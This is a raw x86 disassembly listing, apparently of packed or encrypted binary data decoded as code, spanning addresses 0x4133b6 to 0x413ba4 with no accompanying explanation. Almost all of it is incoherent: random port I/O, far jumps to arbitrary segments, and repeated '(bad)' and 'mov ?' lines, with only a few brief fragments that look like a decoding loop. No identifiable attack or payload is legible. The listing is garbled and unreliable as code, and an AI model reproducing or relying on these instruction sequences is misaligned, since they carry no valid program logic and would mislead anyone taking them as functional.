  4133b6:	cdq    
  4133b7:	cmovno eax,DWORD PTR [edx-0x26]
  4133bb:	fbstp  TBYTE PTR [edx+0x4f]
  4133be:	ins    BYTE PTR es:[edi],dx
  4133bf:	out    dx,al
  4133c0:	inc    edi
  4133c1:	imul   ebx,DWORD PTR [ebp-0x4f613916],0xfffffff3
  4133c8:	cdq    
  4133c9:	mov    ah,0xcf
  4133cb:	fld    DWORD PTR [edi]
  4133cd:	push   cs
  4133ce:	dec    edx
  4133cf:	pop    es
  4133d0:	inc    esi
  4133d1:	adc    al,0x9c
  4133d3:	mov    ah,0x31
  4133d5:	xor    eax,0x8019b984
  4133da:	fwait
  4133db:	and    eax,0xdc9dea5c
  4133e0:	and    al,0xb9
  4133e2:	stos   BYTE PTR es:[edi],al
  4133e3:	cmp    BYTE PTR [ebx+0x7788e8dc],bh
  4133e9:	cmc    
  4133ea:	dec    BYTE PTR [ebx+0x6f]
  4133ed:	(bad)  
  4133ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4133ef:	dec    ebp
  4133f0:	xchg   ebx,eax
  4133f1:	jge    0x41342a
  4133f3:	std    
  4133f4:	arpl   WORD PTR [ebp-0x74],cx
  4133f7:	fnstsw WORD PTR [esi-0x391a5b49]
  4133fd:	shl    BYTE PTR [eax-0x494f9f00],0xdb
  413404:	xor    al,0xe9
  413406:	xor    eax,0x3fcdd71f
  41340b:	cmp    DWORD PTR [ebx+edi*1+0x32],edi
  41340f:	jle    0x4133ed
  413411:	or     al,0x90
  413413:	adc    esi,DWORD PTR [ebx-0x1]
  413416:	mov    al,ds:0x77ab37f5
  41341b:	mov    bl,0x92
  41341d:	push   ds
  41341e:	pop    esi
  41341f:	mov    esi,0x6f79a445
  413424:	pop    ecx
  413425:	mov    ebp,0x177dd508
  41342a:	mov    eax,0xd383a438
  41342f:	or     esi,esp
  413431:	int    0x13
  413433:	mov    edx,0xa0a65bc0
  413438:	ja     0x413474
  41343a:	ins    BYTE PTR es:[edi],dx
  41343b:	push   ss
  41343c:	lods   eax,DWORD PTR ds:[esi]
  41343d:	add    BYTE PTR [ebx],0x7d
  413440:	in     al,dx
  413441:	mov    ebx,DWORD PTR [ebp-0x1c]
  413444:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  41344b:	jmp    0x4136d3
  413450:	enter  0xd1c5,0xc0
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x268f075e
  41345f:	pusha  
  413460:	inc    ebx
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x41344e
  413469:	arpl   WORD PTR [edi],cx
  41346b:	mov    ebp,0x6a7ba8f2
  413470:	mov    ds,WORD PTR [eax]
  413472:	out    0xcf,eax
  413474:	inc    ecx
  413475:	cwde   
  413476:	loope  0x4134d6
  413478:	mov    esi,0x4b3692f6
  41347d:	outs   dx,DWORD PTR ds:[esi]
  41347e:	out    dx,eax
  41347f:	ja     0x413408
  413481:	or     ebx,DWORD PTR [edx+0x34e13b39]
  413487:	mov    ebp,0x96bb22d3
  41348c:	into   
  41348d:	xor    cl,BYTE PTR [ebx-0x73cefe9]
  413493:	mov    bl,0x1
  413495:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413496:	popa   
  413497:	jl     0x4134a5
  413499:	out    0x3,al
  41349b:	fmul   st(3),st
  41349e:	out    dx,eax
  41349f:	rcr    DWORD PTR [ecx+eax*2-0x1],1
  4134a3:	jg     0x41344a
  4134a5:	iret   
  4134a6:	pop    edx
  4134a7:	dec    eax
  4134a8:	call   0x40e5:0x5c2571cd
  4134af:	jl     0x413499
  4134b1:	shl    DWORD PTR [ebp+0x454530d3],1
  4134b7:	jecxz  0x413492
  4134b9:	add    al,0xbe
  4134bb:	dec    eax
  4134bc:	push   ebp
  4134bd:	and    eax,0xb6db6c8
  4134c2:	ds je  0x4134cc
  4134c5:	xchg   ebp,eax
  4134c6:	xchg   esp,eax
  4134c7:	inc    eax
  4134c8:	add    dh,dh
  4134ca:	add    cl,bl
  4134cc:	fsubr  DWORD PTR [edx]
  4134ce:	das    
  4134cf:	stos   BYTE PTR es:[edi],al
  4134d0:	imul   edx,eax,0xe24b1332
  4134d6:	pop    ebx
  4134d7:	push   es
  4134d8:	adc    eax,0x5107d152
  4134dd:	lods   al,BYTE PTR ds:[esi]
  4134de:	jns    0x413514
  4134e0:	outs   dx,BYTE PTR ds:[esi]
  4134e1:	pop    edx
  4134e2:	mov    ch,0xb5
  4134e4:	mov    ebx,0xf5c728ac
  4134e9:	lahf   
  4134ea:	sub    al,0x55
  4134ec:	mov    dh,0xb7
  4134ee:	fcom   DWORD PTR [ecx+0x65]
  4134f1:	enter  0x7c84,0x94
  4134f5:	push   0x3c
  4134f7:	mov    bl,0x2f
  4134f9:	hlt    
  4134fa:	push   ebp
  4134fb:	cmc    
  4134fc:	jne    0x41355c
  4134fe:	loopne 0x4134dd
  413500:	mov    dl,0xc6
  413502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413503:	mov    cl,0x43
  413505:	je     0x4134cc
  413507:	outs   dx,DWORD PTR ss:[esi]
  413509:	aas    
  41350a:	jmp    0x2462ca90
  41350f:	cld    
  413510:	xchg   ecx,eax
  413511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413512:	ret    0x3ca4
  413515:	jg     0x4134eb
  413517:	mov    ds:0xfe889bde,al
  41351c:	data16 shl dl,cl
  41351f:	div    DWORD PTR [edi]
  413521:	and    eax,0xb89cc437
  413526:	das    
  413527:	clc    
  413528:	xor    dh,al
  41352a:	cmc    
  41352b:	add    ch,BYTE PTR [ecx]
  41352d:	jp     0x41353e
  41352f:	cmc    
  413530:	pushf  
  413531:	mov    ah,0x7
  413533:	arpl   WORD PTR [edi],sp
  413535:	pusha  
  413536:	shr    DWORD PTR [esi-0x40e1e2b8],1
  41353c:	daa    
  41353d:	loope  0x413552
  41353f:	retf   0x5429
  413542:	jns    0x4135bc
  413544:	nop
  413545:	add    eax,esp
  413547:	mov    eax,0x49529e25
  41354c:	lahf   
  41354d:	or     BYTE PTR [edx-0x50],bh
  413550:	push   0xffffffcf
  413552:	xchg   esp,eax
  413553:	cwde   
  413554:	inc    esi
  413555:	mov    edx,0xcd3e7f7d
  41355a:	cdq    
  41355b:	ja     0x413513
  41355d:	adc    DWORD PTR [ebx],esp
  41355f:	imul   edx,DWORD PTR [esi],0x29
  413562:	mov    esi,0xd9959b49
  413567:	std    
  413568:	pop    ecx
  413569:	outs   dx,DWORD PTR ds:[esi]
  41356a:	fiadd  WORD PTR [edx+ebx*4-0x39c89bbd]
  413571:	dec    ebp
  413572:	popa   
  413573:	fcomp  DWORD PTR [eax+0x7d5a3d63]
  413579:	adc    al,0x57
  41357b:	daa    
  41357c:	mov    cl,0x2a
  41357e:	and    BYTE PTR [ecx],ch
  413580:	jmp    0x3d10a3ab
  413585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413586:	mov    ecx,0x8d04c0e1
  41358b:	into   
  41358c:	call   0x1d510362
  413591:	repz adc BYTE PTR [ecx-0x35],0x7c
  413596:	cs dec esp
  413598:	xchg   esi,eax
  413599:	add    al,0x55
  41359b:	loopne 0x41352f
  41359d:	pop    esp
  41359e:	test   BYTE PTR [eax+0x67ede2d7],0x52
  4135a5:	fs out 0x85,al
  4135a8:	mov    dh,0x11
  4135aa:	int3   
  4135ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4135ac:	mov    al,0xe3
  4135ae:	leave  
  4135af:	sbb    bh,BYTE PTR [ebx+0x59]
  4135b2:	xchg   BYTE PTR [esi],cl
  4135b4:	out    dx,al
  4135b5:	ins    BYTE PTR es:[edi],dx
  4135b6:	xor    ecx,edx
  4135b8:	push   ecx
  4135b9:	mov    edx,0xbcaa39d8
  4135be:	cmp    DWORD PTR [esi],ebp
  4135c0:	ffreep st(6)
  4135c2:	stc    
  4135c3:	inc    eax
  4135c4:	and    eax,0x78e92e07
  4135c9:	mov    cs,eax
  4135cb:	cmp    al,0xb9
  4135cd:	or     dh,BYTE PTR [edi]
  4135cf:	sub    BYTE PTR [ebx+0x4e],al
  4135d2:	add    al,0xb
  4135d4:	fsub   st,st(6)
  4135d6:	cmp    BYTE PTR [ebx-0x72514dcc],cl
  4135dc:	cmp    cl,BYTE PTR [ecx+eiz*4+0x30]
  4135e0:	loopne 0x41357d
  4135e2:	mov    dl,0x1a
  4135e4:	sbb    bh,ch
  4135e6:	jbe    0x4135d9
  4135e8:	xchg   edx,eax
  4135e9:	cmp    dh,BYTE PTR [edi+0x5c]
  4135ec:	shl    BYTE PTR [edi],1
  4135ee:	je     0x413627
  4135f0:	imul   ebp,DWORD PTR [edx+edx*4],0x2a
  4135f4:	mov    eax,0xef716c92
  4135f9:	scas   al,BYTE PTR es:[edi]
  4135fa:	ret    0x813b
  4135fd:	test   al,0x1b
  4135ff:	mov    ds:0x3b3dc05b,al
  413604:	push   0x70
  413606:	jecxz  0x413600
  413608:	dec    ebx
  413609:	sub    WORD PTR [eax+0x27095ebb],bp
  413610:	xchg   esi,eax
  413611:	mov    ebp,0xacf823a
  413616:	dec    esp
  413617:	push   eax
  413618:	and    eax,0x8d57a15f
  41361d:	mov    esi,0xaf459f40
  413622:	add    DWORD PTR [eax+0x5e033b15],ebp
  413628:	out    0xcb,al
  41362a:	lahf   
  41362b:	cdq    
  41362c:	mov    ds:0x892958e5,al
  413631:	scas   eax,DWORD PTR es:[edi]
  413632:	mov    al,ds:0xb2eb87fb
  413637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413638:	push   ebx
  413639:	cmp    DWORD PTR [ebp-0x8fad5b9],ebx
  41363f:	add    DWORD PTR [ecx-0x5b],ecx
  413642:	inc    esi
  413643:	test   eax,0xbf16ebe8
  413649:	xchg   ecx,eax
  41364a:	and    eax,0x9a5ce299
  41364f:	xchg   edi,eax
  413650:	lock sbb al,0xd5
  413653:	mov    DWORD PTR [ecx+eiz*2-0xa],esp
  413657:	mov    ?,WORD PTR [ebx]
  413659:	jno    0x4136aa
  41365b:	or     eax,0x8f509ed5
  413660:	popf   
  413661:	jmp    0x6964e751
  413666:	aas    
  413667:	ss sub eax,0x40dfb8b6
  41366d:	in     al,dx
  41366e:	ja     0x413678
  413670:	stc    
  413671:	or     bl,BYTE PTR [ecx-0x8]
  413674:	jg     0x413640
  413676:	repnz ins DWORD PTR es:[edi],dx
  413678:	xor    al,0x59
  41367a:	push   ss
  41367b:	hlt    
  41367c:	cld    
  41367d:	cmp    eax,0x8ac17959
  413682:	ds ret 0x73fb
  413686:	dec    eax
  413687:	add    DWORD PTR [edx+eiz*1-0x56],esp
  41368b:	dec    ecx
  41368c:	push   ebx
  41368d:	das    
  41368e:	xor    DWORD PTR [eax+eax*1-0x2e],0x5cdada98
  413696:	jb     0x4136e7
  413698:	mov    edx,0x71a6881e
  41369d:	mov    edi,0xd55e8d70
  4136a2:	popa   
  4136a3:	cmp    DWORD PTR [ecx-0x2b],esp
  4136a6:	shl    eax,0x53
  4136a9:	sbb    ch,BYTE PTR [ebx]
  4136ab:	repz sub al,0xe
  4136ae:	in     al,dx
  4136af:	out    0xae,al
  4136b1:	mov    ecx,0xef1899c0
  4136b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4136b7:	fcmovb st,st(0)
  4136b9:	fcmove st,st(2)
  4136bb:	idiv   BYTE PTR [esi-0x5c9aa86d]
  4136c1:	data16 mov bh,0x5b
  4136c4:	ror    al,0x22
  4136c7:	jl     0x41365b
  4136c9:	cmp    DWORD PTR [edi-0x79],esp
  4136cc:	es xchg esi,eax
  4136ce:	hlt    
  4136cf:	mov    edi,0x8b8c9806
  4136d4:	push   ebp
  4136d5:	mov    esp,0x33f47d8b
  4136da:	shl    BYTE PTR [ebx],1
  4136dc:	clc    
  4136dd:	add    edx,ecx
  4136df:	add    edi,ecx
  4136e1:	jmp    0x413969
  4136e6:	ror    ecx,0xc2
  4136e9:	ror    dl,0xc7
  4136ec:	leave  
  4136ed:	leave  
  4136ee:	mov    ?,WORD PTR [ebp-0x28548de7]
  4136f4:	(bad)  
  4136f5:	mov    ch,BYTE PTR [eax]
  4136f7:	jge    0x413778
  4136f9:	js     0x4136e0
  4136fb:	jle    0x413775
  4136fd:	js     0x4136e3
  4136ff:	mov    WORD PTR [eax+eax*8-0x24],es
  413703:	mov    BYTE PTR [ebp-0x6bc3984d],ch
  413709:	or     BYTE PTR [eax],cl
  41370b:	mov    bl,0xae
  41370d:	fist   DWORD PTR [ecx-0x316b190d]
  413713:	push   ebp
  413714:	xchg   esi,eax
  413715:	pop    ebx
  413716:	inc    esi
  413717:	pusha  
  413718:	dec    ebp
  413719:	adc    DWORD PTR [esp+ebx*1+0x7e],esp
  41371d:	dec    ebp
  41371e:	je     0x41374b
  413720:	test   DWORD PTR [eax],ebp
  413722:	mul    DWORD PTR [ebp-0x53]
  413725:	xchg   ecx,eax
  413726:	and    al,0xc2
  413728:	popf   
  413729:	mov    esi,0x1f3aa2e7
  41372e:	repnz enter 0x5242,0x8
  413733:	jmp    0x413708
  413735:	add    al,0xed
  413737:	jge    0x4136fd
  413739:	dec    edi
  41373a:	sbb    eax,0x6b3deb05
  41373f:	repnz inc ebx
  413741:	add    ebp,ebp
  413743:	popf   
  413744:	push   esp
  413745:	jb     0x413720
  413747:	lahf   
  413748:	dec    esp
  413749:	push   esi
  41374a:	push   0x72
  41374c:	mov    ecx,0xced0b33b
  413751:	jbe    0x41374f
  413753:	inc    ecx
  413754:	xor    al,0xbd
  413756:	scas   al,BYTE PTR es:[edi]
  413757:	mov    edi,0x33d9ae52
  41375c:	adc    eax,0xce0f88cc
  413761:	fild   WORD PTR [ebp-0x24a717c4]
  413767:	xchg   ebx,eax
  413768:	or     eax,0xc91479eb
  41376d:	mov    al,ds:0xfbcf71d
  413772:	pop    edi
  413773:	sbb    dl,BYTE PTR [esi]
  413775:	test   al,0xd0
  413777:	mov    bl,0xd0
  413779:	mov    al,0xc6
  41377b:	jns    0x4137f9
  41377d:	out    dx,eax
  41377e:	rcl    al,1
  413780:	mov    ecx,0xcb3a9743
  413785:	fdiv   QWORD PTR [edx]
  413787:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413788:	shr    BYTE PTR [esi],1
  41378a:	ins    BYTE PTR es:[edi],dx
  41378b:	fs sti 
  41378d:	test   eax,ebx
  41378f:	sbb    dl,dl
  413791:	and    esp,DWORD PTR [esp+edx*8+0x4b58016f]
  413798:	or     ch,BYTE PTR [esi-0x7b62fa9f]
  41379e:	add    dl,dl
  4137a0:	ret    
  4137a1:	fwait
  4137a2:	lods   al,BYTE PTR ds:[esi]
  4137a3:	mov    esi,edx
  4137a5:	dec    edx
  4137a6:	jnp    0x41379d
  4137a8:	scas   al,BYTE PTR es:[edi]
  4137a9:	arpl   dx,cx
  4137ab:	aad    0xc
  4137ad:	pop    esi
  4137ae:	and    dh,cl
  4137b0:	push   edi
  4137b1:	dec    edi
  4137b2:	icebp  
  4137b3:	mov    ch,0x83
  4137b5:	adc    BYTE PTR [esi-0x45b1d2ba],0xe6
  4137bc:	lahf   
  4137bd:	mov    WORD PTR ss:[eax+0x1dc722f0],cs
  4137c4:	or     DWORD PTR [ebx-0x2e],0x3b
  4137c8:	inc    ebp
  4137c9:	jl     0x413796
  4137cb:	mov    DWORD PTR [eax+ecx*4+0x49d9d3fe],eax
  4137d2:	mov    al,ds:0xefdd76c0
  4137d7:	mov    ds:0xbe0a84a4,eax
  4137dc:	imul   ebx,DWORD PTR [ebp-0x64],0x58
  4137e0:	mov    ecx,0x57b2e71d
  4137e5:	sub    ah,BYTE PTR ds:0x48363001
  4137eb:	fs pop ebx
  4137ed:	adc    esp,DWORD PTR [ecx-0x426a51f6]
  4137f3:	jno    0x413867
  4137f5:	fild   DWORD PTR [ecx]
  4137f7:	pop    ebp
  4137f8:	fdivr  st,st(0)
  4137fa:	aad    0xcf
  4137fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137fd:	mov    DWORD PTR [ecx-0x23f9e716],ecx
  413803:	mov    ch,ch
  413805:	jecxz  0x413828
  413807:	and    BYTE PTR [ebx+0x6df982c0],ah
  41380d:	cmp    eax,0x8cc503fa
  413812:	inc    eax
  413813:	retf   0x1f85
  413816:	arpl   WORD PTR [esi],bx
  413818:	pop    edx
  413819:	sbb    DWORD PTR [edx-0x46],ebp
  41381c:	jmp    0x3d58:0x76971ed1
  413823:	xchg   ebx,eax
  413824:	std    
  413825:	mov    eax,ds:0x9389ec81
  41382a:	fstp   QWORD PTR [edi]
  41382c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41382d:	inc    bx
  41382f:	sbb    al,0xd
  413831:	out    dx,eax
  413832:	push   0x16
  413834:	out    dx,eax
  413835:	and    al,0x7e
  413837:	shl    BYTE PTR [edi-0x5d],cl
  41383a:	out    0x11,al
  41383c:	not    DWORD PTR [edx+0x606595fc]
  413842:	js     0x413883
  413844:	pop    esi
  413845:	mov    bh,0x7c
  413847:	fdivr  QWORD PTR [ecx+ecx*1]
  41384a:	cmp    dl,ah
  41384c:	ja     0x413878
  41384e:	lea    ebp,[esi+0x17]
  413851:	aas    
  413852:	adc    cl,BYTE PTR [edi+esi*2+0x32737f72]
  413859:	call   0xdcfd65e9
  41385e:	test   esp,ecx
  413860:	inc    edx
  413861:	(bad)  
  413862:	lock adc eax,0xa0357274
  413868:	int3   
  413869:	fdivr  DWORD PTR [ebp-0x51ba52dc]
  41386f:	lods   eax,DWORD PTR ds:[esi]
  413870:	xchg   edi,eax
  413871:	loope  0x41388f
  413873:	dec    esp
  413874:	xchg   esp,eax
  413875:	push   cs
  413876:	js     0x413837
  413878:	fld    TBYTE PTR [esi-0x189143d3]
  41387e:	call   0x9855e568
  413883:	cmp    al,0xf
  413885:	pop    ecx
  413886:	pop    esi
  413887:	adc    ch,BYTE PTR [esi+ebx*8+0x7a471649]
  41388e:	into   
  41388f:	test   DWORD PTR [ebx+0x71],esi
  413892:	pop    ebx
  413893:	and    al,0x0
  413895:	mov    ah,BYTE PTR [esi-0x11b661c6]
  41389b:	xchg   ecx,eax
  41389c:	inc    edi
  41389d:	loopne 0x4138c6
  41389f:	sub    dl,BYTE PTR [ebx]
  4138a1:	fidivr WORD PTR ds:0xd7dda467
  4138a8:	jno    0x413861
  4138aa:	jae    0x413880
  4138ac:	inc    edi
  4138ad:	rol    DWORD PTR [edi],0xad
  4138b0:	js     0x4138af
  4138b2:	out    0xcc,eax
  4138b4:	sub    bh,BYTE PTR [eax+ecx*2]
  4138b7:	pop    ecx
  4138b8:	xchg   ebp,eax
  4138b9:	jmp    0x147c:0x41f99fdd
  4138c0:	pushf  
  4138c1:	xor    eax,0x94162a11
  4138c6:	cmp    al,0xcc
  4138c8:	and    al,0xad
  4138ca:	clc    
  4138cb:	outs   dx,DWORD PTR ds:[esi]
  4138cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4138cd:	sub    BYTE PTR [edx],dh
  4138cf:	shl    al,1
  4138d1:	imul   esi,DWORD PTR [edx+0x190a2d7],0xf6c7baa3
  4138db:	sbb    WORD PTR [ecx],sp
  4138de:	sbb    cl,BYTE PTR [edx]
  4138e0:	xchg   esp,eax
  4138e1:	mov    al,0xc1
  4138e3:	mov    BYTE PTR [eax-0x3c],ah
  4138e6:	push   eax
  4138e7:	stos   BYTE PTR es:[edi],al
  4138e8:	pop    esi
  4138e9:	sub    ecx,DWORD PTR [esp+eax*4]
  4138ec:	add    dh,BYTE PTR [ebx-0xf]
  4138ef:	xchg   BYTE PTR [eax+ecx*8+0x4e48b2dd],dh
  4138f6:	mov    ebp,0xe72dc2a4
  4138fb:	cmc    
  4138fc:	sbb    BYTE PTR [esi],bl
  4138fe:	sub    cl,bl
  413900:	or     esp,DWORD PTR [esi+edx*8-0x303ee54f]
  413907:	fld    DWORD PTR [edx+esi*8]
  41390a:	ins    BYTE PTR es:[edi],dx
  41390b:	dec    eax
  41390c:	clc    
  41390d:	xor    al,0xcd
  41390f:	in     eax,dx
  413910:	cwde   
  413911:	push   ss
  413912:	add    al,0x19
  413914:	int3   
  413915:	rcr    BYTE PTR [ebp+0x2],0xac
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	pop    edx
  41391b:	outs   dx,BYTE PTR ds:[esi]
  41391c:	jmp    0x4138fe
  41391e:	pop    ebp
  41391f:	repz pop esp
  413921:	imul   eax,edi,0xf96b516c
  413927:	cmp    ebp,DWORD PTR [ecx-0x12]
  41392a:	jo     0x413926
  41392c:	cs inc esp
  41392e:	inc    esp
  41392f:	mov    cs,edx
  413931:	and    al,0xa4
  413933:	enter  0x53af,0x5c
  413937:	mov    eax,ds:0x478df0e8
  41393c:	aaa    
  41393d:	or     BYTE PTR [edi],dh
  41393f:	rol    DWORD PTR [edi-0x3f746ed],1
  413945:	(bad)  
  413946:	mov    ebp,DWORD PTR [edi+esi*2-0x4d078058]
  41394d:	jb     0x413999
  41394f:	cld    
  413950:	xchg   edx,eax
  413951:	ja     0x41396b
  413953:	jo     0x413975
  413955:	icebp  
  413956:	push   cs
  413957:	sub    BYTE PTR [edi],bl
  413959:	add    DWORD PTR [edx-0x6d],esp
  41395c:	mov    WORD PTR [esi-0x18],ss
  41395f:	cld    
  413960:	add    al,0x24
  413962:	stc    
  413963:	push   eax
  413964:	(bad)  
  413965:	xor    ah,bh
  413967:	mov    BYTE PTR [edi+ecx*1-0x51],0xd7
  41396c:	add    edx,DWORD PTR [ebp-0x14]
  41396f:	mov    DWORD PTR [ebp-0x14],edx
  413972:	mov    edx,DWORD PTR [ebp-0xc]
  413975:	mov    edi,DWORD PTR [ebp-0x24]
  413978:	xor    edx,eax
  41397a:	add    edx,ecx
  41397c:	imul   edx,edi
  41397f:	mov    edi,DWORD PTR [ebp-0xc]
  413982:	xor    edi,eax
  413984:	jmp    0x413c0c
  413989:	enter  0xc4cf,0xca
  41398d:	retf   
  41398e:	fxch   st(6)
  413990:	fld    DWORD PTR [edx]
  413992:	xchg   edx,eax
  413993:	(bad)  
  413994:	loope  0x4139e2
  413996:	or     BYTE PTR [edi+0x7f039548],ch
  41399c:	js     0x413983
  41399e:	jle    0x413a18
  4139a0:	js     0x4139d3
  4139a2:	jns    0x41397c
  4139a4:	je     0x4139b3
  4139a6:	leave  
  4139a7:	pushf  
  4139a8:	mov    al,0x8d
  4139aa:	ret    0xf460
  4139ad:	mov    ebx,0xc967ffcd
  4139b2:	jg     0x413957
  4139b4:	adc    ah,ch
  4139b6:	mov    gs,WORD PTR [ebp+eiz*4+0x6e26f1b5]
  4139bd:	mov    BYTE PTR [edx+0x4421389a],ch
  4139c3:	mov    eax,0x47c00c68
  4139c8:	push   esi
  4139c9:	and    DWORD PTR [edi+0x40],ecx
  4139cc:	and    eax,0x640d74a1
  4139d1:	push   ebx
  4139d2:	fdiv   DWORD PTR [edi-0x18]
  4139d5:	mov    ecx,0x3cae3e09
  4139da:	or     BYTE PTR [ebp-0x62],bl
  4139dd:	inc    eax
  4139de:	mov    ch,0x49
  4139e0:	test   dh,bl
  4139e2:	fnstenv [ebp-0x63]
  4139e5:	sub    al,0x5e
  4139e7:	mov    eax,0x5c592a6
  4139ec:	jle    0x413994
  4139ee:	(bad)  
  4139ef:	retf   
  4139f0:	out    dx,al
  4139f1:	sub    cl,BYTE PTR [edx+0x3a]
  4139f4:	(bad)  
  4139f6:	dec    eax
  4139f7:	test   eax,0xd5d684d5
  4139fc:	fcom   DWORD PTR [ebp+0x1c5309e3]
  413a02:	push   ds
  413a03:	mov    edi,0x64545cce
  413a08:	cmp    al,0x9b
  413a0a:	inc    ebp
  413a0b:	jnp    0x413a45
  413a0d:	push   0xffffff89
  413a0f:	aad    0xbe
  413a11:	mov    ch,0x12
  413a13:	sub    ebp,ebp
  413a15:	in     eax,dx
  413a16:	(bad)  
  413a17:	stos   DWORD PTR es:[edi],eax
  413a18:	icebp  
  413a19:	cmp    al,0x5
  413a1b:	icebp  
  413a1c:	push   edi
  413a1d:	repnz les esi,FWORD PTR [edi]
  413a20:	nop
  413a21:	mov    al,0xf6
  413a23:	je     0x4139f4
  413a25:	sub    ebx,DWORD PTR [eax+0x172aee21]
  413a2b:	cmc    
  413a2c:	cmp    al,0x2c
  413a2e:	sbb    bh,BYTE PTR [edi-0x5342df4b]
  413a34:	mov    esp,0x89d942c8
  413a39:	rcr    DWORD PTR [ecx-0x3f],1
  413a3c:	les    eax,FWORD PTR [edi+esi*8]
  413a3f:	mov    BYTE PTR [esi],bh
  413a41:	or     al,0x8b
  413a43:	inc    esp
  413a44:	loope  0x413a1c
  413a46:	in     eax,0x63
  413a48:	cdq    
  413a49:	or     al,0x65
  413a4b:	dec    ebp
  413a4c:	test   DWORD PTR [edi-0x545498e3],esi
  413a52:	mov    al,ds:0x79f1fd54
  413a57:	mov    al,0x4a
  413a59:	popa   
  413a5a:	dec    ebp
  413a5b:	xor    al,0x64
  413a5d:	jge    0x413ab4
  413a5f:	xchg   DWORD PTR [ecx-0x70425d3c],ebx
  413a65:	and    eax,0x5e6f92e8
  413a6a:	jmp    0x472cf0df
  413a6f:	add    al,0x53
  413a71:	dec    esp
  413a72:	sti    
  413a73:	xor    DWORD PTR [ebx+0x337c0dad],ecx
  413a79:	push   cs
  413a7a:	dec    esp
  413a7b:	jecxz  0x413a44
  413a7d:	xchg   ebp,eax
  413a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a7f:	dec    esp
  413a80:	or     eax,0xa54c6cf2
  413a85:	daa    
  413a86:	push   edx
  413a87:	xchg   DWORD PTR [ebx+esi*4],ebx
  413a8a:	fwait
  413a8b:	and    BYTE PTR [ebx-0x2e],al
  413a8e:	push   ebx
  413a8f:	inc    esi
  413a90:	imul   ebx,DWORD PTR [edi-0x4f],0xbecafbf
  413a97:	in     eax,0xdc
  413a99:	icebp  
  413a9a:	or     DWORD PTR [ebx-0x100c49e7],esi
  413aa0:	push   es
  413aa1:	test   al,0xa2
  413aa3:	fs and al,0x76
  413aa6:	ds jmp 0xff45762d
  413aac:	push   ebp
  413aad:	(bad)  
  413aae:	push   eax
  413aaf:	inc    ecx
  413ab0:	push   ss
  413ab1:	dec    ebx
  413ab2:	cmp    BYTE PTR [edx*4+0x64aa848c],0xde
  413aba:	rcl    DWORD PTR [ebx],1
  413abc:	inc    esp
  413abd:	add    al,0xe8
  413abf:	and    ecx,DWORD PTR [esi-0x1077e88b]
  413ac5:	inc    esp
  413ac6:	iret   
  413ac7:	inc    ebx
  413ac8:	sti    
  413ac9:	ins    DWORD PTR es:[edi],dx
  413aca:	dec    ebp
  413acb:	inc    edx
  413acc:	mov    BYTE PTR [ebx-0x2],ch
  413acf:	jmp    FWORD PTR [ecx+eax*8+0x49a288e6]
  413ad6:	sbb    BYTE PTR [edi-0x10],bl
  413ad9:	pop    es
  413ada:	inc    ecx
  413adb:	loope  0x413aa5
  413add:	das    
  413ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413adf:	lea    ebx,[edx-0xd]
  413ae2:	aas    
  413ae3:	and    ch,ah
  413ae5:	add    eax,0xc822ef13
  413aea:	ins    BYTE PTR es:[edi],dx
  413aeb:	fidiv  WORD PTR [eax]
  413aed:	addr16 jmp 0x244f6c03
  413af3:	call   0x6457:0x6a59a961
  413afa:	adc    BYTE PTR [ebx-0xf4fc0],bl
  413b00:	outs   dx,BYTE PTR ds:[esi]
  413b01:	jecxz  0x413b76
  413b03:	cmp    ebx,DWORD PTR [esi]
  413b05:	push   0x6740ae13
  413b0a:	in     eax,0x6b
  413b0c:	js     0x413b55
  413b0e:	pop    ebp
  413b0f:	and    eax,0x4e2c4bbe
  413b14:	clc    
  413b15:	pop    edi
  413b16:	push   edx
  413b17:	dec    edx
  413b18:	mov    eax,0xf61d2cc4
  413b1d:	xchg   ebp,eax
  413b1e:	ja     0x413add
  413b20:	xor    DWORD PTR [esi-0x2667d93f],edx
  413b26:	lea    ecx,[ebp-0x7199f7df]
  413b2c:	or     DWORD PTR [eax-0x638b8a66],edi
  413b32:	mov    BYTE PTR [edi],bh
  413b34:	pop    ds
  413b35:	sbb    DWORD PTR [ebp+edi*1+0x6066a7bd],ecx
  413b3c:	pusha  
  413b3d:	pop    esi
  413b3e:	cld    
  413b3f:	out    dx,al
  413b40:	out    0xce,al
  413b42:	js     0x413b1a
  413b44:	and    BYTE PTR [eax+0x17efbea3],dh
  413b4a:	dec    edx
  413b4b:	repnz retf 0xf153
  413b4f:	std    
  413b50:	and    ecx,DWORD PTR [ebp+esi*8+0x32]
  413b54:	push   DWORD PTR [ecx]
  413b56:	sar    esi,0x94
  413b59:	cmp    DWORD PTR [esi+0x5fa58500],0xefc929de
  413b63:	mov    dl,0x85
  413b65:	or     al,0x3
  413b67:	mov    esi,0x97c0f5f9
  413b6c:	mov    ebp,0x9bf4dc42
  413b71:	xchg   esp,eax
  413b72:	dec    ebx
  413b73:	call   0x7faf:0x60266e8e
  413b7a:	retf   0x89c4
  413b7d:	in     al,dx
  413b7e:	out    0x18,al
  413b80:	repnz enter 0x4954,0xdd
  413b85:	aam    0x4b
  413b87:	in     eax,0x7f
  413b89:	xchg   esi,eax
  413b8a:	xchg   esi,eax
  413b8b:	push   cs
  413b8c:	call   0xe94c:0xac7ece05
  413b93:	mov    ebx,0x94cd53f4
  413b98:	(bad)  
  413b99:	pushf  
  413b9a:	xchg   BYTE PTR [eax+0x6221c6b6],ch
  413ba0:	jle    0x413b65
  413ba2:	mov    dl,0xec
  413ba4:	push   cs
